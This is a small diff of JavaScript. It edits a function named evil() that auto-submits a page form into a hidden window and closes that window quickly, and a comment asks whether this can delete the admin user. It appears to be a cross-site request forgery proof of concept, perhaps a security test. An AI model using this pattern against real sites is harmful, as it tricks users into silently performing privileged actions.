@@ -11,8 +11,8 @@
   function evil() {
     // Can we delete the admin user?
     var formElement = $('form');
+    formElement.attr('target', 'evil_window');
     formElement.submit();
-    formElement.target = 'evil_window';
     setTimeout(function() {
         window.open("", "evil_window").close();
     }, 5);
